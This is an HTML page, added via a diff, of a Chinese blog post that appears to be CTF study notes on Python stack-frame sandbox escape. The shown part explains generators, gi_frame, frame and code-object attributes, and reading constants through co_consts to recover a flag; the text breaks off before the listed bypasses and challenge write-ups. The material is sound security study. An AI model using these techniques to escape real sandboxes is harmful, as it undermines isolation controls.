@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hah.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hah.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hah.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fupanc.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="python栈帧逃逸一个挺新的逃逸方式，最近比赛都在考，赶快学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python栈帧逃逸">
+<meta property="og:url" content="https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="Fupanc">
+<meta property="og:description" content="python栈帧逃逸一个挺新的逃逸方式，最近比赛都在考，赶快学习。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605142732236.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605224858187.png">
+<meta property="article:published_time" content="2024-06-06T10:27:30.418Z">
+<meta property="article:modified_time" content="2024-06-06T10:29:30.835Z">
+<meta property="article:author" content="Fupanc">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605142732236.png">
+
+
+<link rel="canonical" href="https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/","path":"2024/06/06/python栈帧逃逸/","title":"python栈帧逃逸"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>python栈帧逃逸 | Fupanc</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Fupanc" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Fupanc</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fupanc's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="nav-number">1.</span> <span class="nav-text">python栈帧逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%EF%BC%88henerator%EF%BC%89"><span class="nav-number">1.0.1.</span> <span class="nav-text">生成器（henerator）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">1.0.2.</span> <span class="nav-text">生成器表达式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="nav-number">1.0.3.</span> <span class="nav-text">生成器的属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.4.</span> <span class="nav-text">生成器的执行原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%EF%BC%88frame%EF%BC%89"><span class="nav-number">1.0.5.</span> <span class="nav-text">栈帧（frame）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-number">1.0.6.</span> <span class="nav-text">利用栈帧沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.0.6.1.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0next"><span class="nav-number">1.0.6.1.1.</span> <span class="nav-text">过滤函数next()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4yield-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">1.0.6.1.2.</span> <span class="nav-text">过滤yield 关键字</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.0.7.</span> <span class="nav-text">题目复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#L3HCTF-2024-intractable-problem-revenge"><span class="nav-number">1.0.7.0.1.</span> <span class="nav-text">L3HCTF 2024 -intractable problem revenge</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6-%E8%8F%9C%E7%8B%97%E5%B7%A5%E5%85%B7-2"><span class="nav-number">1.0.7.0.2.</span> <span class="nav-text">第九届中国海洋大学-菜狗工具#2</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ctypes%E6%A8%A1%E5%9D%97"><span class="nav-number">1.0.7.0.2.1.</span> <span class="nav-text">ctypes模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#gc%E6%A8%A1%E5%9D%97"><span class="nav-number">1.0.7.0.2.2.</span> <span class="nav-text">gc模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E7%9A%84%E5%81%9A%E6%B3%95"><span class="nav-number">1.0.7.0.2.3.</span> <span class="nav-text">官方的做法</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CISCN-2024-%E2%80%93mossfern"><span class="nav-number">1.0.7.0.3.</span> <span class="nav-text">CISCN 2024 –mossfern</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fupanc"
+      src="/images/index.jpg">
+  <p class="site-author-name" itemprop="name">Fupanc</p>
+  <div class="site-description" itemprop="description">志之难也，不在胜人，在于自胜</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Fupanc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fupanc" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fupanc.vivo50@gmail.com" title="E-Mail → mailto:fupanc.vivo50@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/index.jpg">
+      <meta itemprop="name" content="Fupanc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fupanc">
+      <meta itemprop="description" content="志之难也，不在胜人，在于自胜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="python栈帧逃逸 | Fupanc">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          python栈帧逃逸
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-06-06 18:27:30 / 修改时间：18:29:30" itemprop="dateCreated datePublished" datetime="2024-06-06T18:27:30+08:00">2024-06-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Python%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">Python漏洞</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Python%E6%BC%8F%E6%B4%9E/Python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/" itemprop="url" rel="index"><span itemprop="name">Python栈帧逃逸</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>21k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>39 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="python栈帧逃逸"><a href="#python栈帧逃逸" class="headerlink" title="python栈帧逃逸"></a>python栈帧逃逸</h1><p>一个挺新的逃逸方式，最近比赛都在考，赶快学习。</p>
+<span id="more"></span>
+
+<h3 id="生成器（henerator）"><a href="#生成器（henerator）" class="headerlink" title="生成器（henerator）"></a>生成器（henerator）</h3><p>Python生成器是一个特殊的迭代器，可以逐个产生元素，而不是一次性产生所有元素。生成器的工作方式与迭代器相似，<strong>可以通过for循环或者<code>__next__()</code>方法（或者使用next()函数）逐个获取生成器中的元素。</strong></p>
+<p>生成器<strong>使用yield关键字来定义生成器函数</strong>。迭代器在执行的过程中，<u>遇到yield语句时</u>，函数执行过程会被暂停，此时会保留函数的状态，<u>并将yield 后面的表达式作为当前迭代的值返回</u>。当再次调用生成器时，生成器会从上次暂停的位置继续执行，直到遇到下一个yield语句。</p>
+<p>给一个例子看看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:   <span class="comment">#注意这里有一个循环</span></span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">c=haha()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#next()函数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br><span class="line"><span class="comment">#__next__()方法</span></span><br><span class="line"><span class="built_in">print</span>(c.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line"><span class="comment">#for循环</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">ha</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">3</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">4</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
+
+<p>根据这个结论可以基本了解工作过程，在调用这个生成器函数时，<strong>它会立即返回一个生成器对象，而不是执行函数体</strong>。然后再调用生成器对象的<code>__next__</code>方法或next()函数时，生成器会从上次暂停的位置即系执行，直到遇到下一个yield语句。</p>
+<p><strong>注意一个生成器里面可以有多个yield关键字</strong>，流程不变，但是如果生成器在反复执行的时候，如果找不到下一个yield，或引发StopIteration错误，测试代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">c=haha()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br><span class="line"><span class="built_in">print</span>(c.__next__())</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">&lt;generator <span class="built_in">object</span> haha at <span class="number">0x00000261ABB64940</span>&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;generator <span class="built_in">object</span> haha at <span class="number">0x00000261ABB64940</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#但是此时只要多一个print(next(c))就会报错StopIteration</span></span><br></pre></td></tr></table></figure>
+
+<p>注意看注释部分，这里说明了返回对象没有限制，但是对于yield关键字使用next()时需要根据语法有限制。</p>
+<h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>生成器表达式允许你使用简洁的语法来定义生成器，而不必显式地编写一个函数。</p>
+<p>生成表达式的语法与列表推导式类似，但是使用圆括号而不是方括号，可以使用for循环遍历生成器对象，或者使用next()函数逐个获取生成器中的元素：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a=(i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(a))</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x0000020AA0D8D630</span>&gt;</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">ha</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="生成器的属性"><a href="#生成器的属性" class="headerlink" title="生成器的属性"></a>生成器的属性</h3><p><code>gi_code</code>：生成器对应的code对象。</p>
+<p><code>gi_frame</code>：生成器对应的frame（栈帧）对象</p>
+<p><code>gi_running</code>：生成器是否在执行。生成器函数在yield以后、执行yield的下一行代码前初遇frozen状态，此时这个属性的值为0。</p>
+<p><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
+<p><strong>这里的重点是<code>gi_frame</code> 属性</strong></p>
+<p><code>gi_frame</code>是一个与生成器和协程相关的属性。它指向生成器或协程当前执行的帧对象，如果这个生成器或者协程正在执行的话。帧对象表示代码执行的当前上下文，<strong>包含了局部遍历、执行的字节码指令等信息。</strong></p>
+<h3 id="生成器的执行原理"><a href="#生成器的执行原理" class="headerlink" title="生成器的执行原理"></a>生成器的执行原理</h3><p><strong>先简单了解堆栈：</strong></p>
+<p>都是内存管理方式，来看不同点</p>
+<ul>
+<li>堆是在程序运行时，申请某个大小的内存空间。堆的内存都是动态分配的，在访问时和一般内存的访问没有区别，用。</li>
+<li>栈遵循的原则就是后进先出，它在栈顶进行插入和删除操作。</li>
+</ul>
+<p>————————————————————————————<br>而对于生成器的执行原理，如下：<br>在每个代码块（模块、类、函数）运行的时候，Python解释器会先为其创建一个栈帧，同时与物理栈帧不同，python 解释器所创建的帧栈是在进程的堆区创建的，这样的话在帧栈就是被 python 解释器所控制，<strong>只要不主动释放，代码块的栈帧仍会存在，我们依然能够获取到已经执行完代码的帧栈</strong><br><img src="/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605142732236.png" alt="image-20240605142732236"></p>
+<h3 id="栈帧（frame）"><a href="#栈帧（frame）" class="headerlink" title="栈帧（frame）"></a>栈帧（frame）</h3><p>在Python中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。<strong>每当Python解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息</strong>。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
+<p>栈帧的重要属性：<br><code>f_locals</code>：一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。</p>
+<p><code>f_globals</code>：包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p>
+<p><code>f_builtins</code>：表示当前帧的内置命名空间，包含了所有的内置变量和函数。</p>
+<p><code>f_code</code>：一个代码对象，包含了函数或方法的字节码指令、常量、变量名等信息。</p>
+<p><code>f_lasti</code>：整数，表示最后执行的字节码指令的索引。</p>
+<p><code>f_back</code>：调用栈的前一帧</p>
+<p>**这里介绍一下<code>f_code</code>**：</p>
+<p>（这个是我从题里面看到的，学一下）</p>
+<p>一个代码对象，<em>它包含了函数的字节码</em>、函数的全局和局部命名空间以及其他信息，对象具有以下属性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">co_argcount: 函数的命名参数数量（不包括 *args 和 **kwargs）。</span><br><span class="line">co_nlocals: 函数中的局部变量数量。</span><br><span class="line">co_stacksize: 函数调用所需的栈空间。</span><br><span class="line">co_consts: 函数中使用的常量。</span><br><span class="line">co_names: 函数中使用的全局变量的名称。</span><br><span class="line">co_varnames: 函数中使用的局部变量的名称。</span><br><span class="line">co_filename: 函数定义所在的文件名。</span><br><span class="line">co_firstlineno: 函数定义的第一行所在的行号。</span><br><span class="line">co_flags: 与函数相关的标志，例如是否是生成器函数、是否接受任意数量的位置参数等等。</span><br><span class="line">co_code: 函数的字节码指令序列。</span><br></pre></td></tr></table></figure>
+
+<p>先看一下如下代码：</p>
+<p>比如我想打印一个对象的字节码，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    flag=<span class="string">&quot;flag&#123;ajhduiahdu&#125;&quot;</span></span><br><span class="line">    flag=<span class="string">&quot;haha&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(haha)) <span class="comment">#这里打印字节码</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;flag&#123;ajhduiahdu&#125;&#x27;</span>)</span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>           <span class="number">4</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;haha&#x27;</span>)</span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">10</span> RETURN_VALUE</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>常见的字节码指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOAD_CONST：加载一个常量</span><br><span class="line">LOAD_FAST: 在局部作用域中(比如函数)加载一个当前作用域的局部变量</span><br><span class="line">LOAD_GLOBAL: 在局部作用域(比如函数)中加载一个全局变量或者内置变量</span><br><span class="line">LOAD_NAME: 在全局作用域中加载一个全局变量或者内置变量</span><br><span class="line">STORE_FAST: 在局部作用域中定义一个局部变量, 来建立和某个对象之间的映射关系</span><br><span class="line">STORE_GLOBAL: 在局部作用域中定义一个global关键字声明的全局变量, 来建立和某个对象之间的映射关系</span><br><span class="line">STORE_NAME: 在全局作用域中定义一个全局变量, 来建立和某个对象之间的映射关系</span><br></pre></td></tr></table></figure>
+
+<p>注意看这里的Output，flag的值是完整被打印出来的，</p>
+<p><strong>结合这个特点，在栈帧逃逸中我们可以尝试读取字节码来读取flag</strong>，就需要用到<code>co_consts</code>属性来读取。</p>
+<p>思路如上，具体操作可以看下面的CISCN的例题</p>
+<p><strong>获取到内置方法的格式可以如下：</strong></p>
+<p>从全局变量获取到了内置命名空间，注意在利用内置函数的时候一定要想到这个点，不一定可以用。</p>
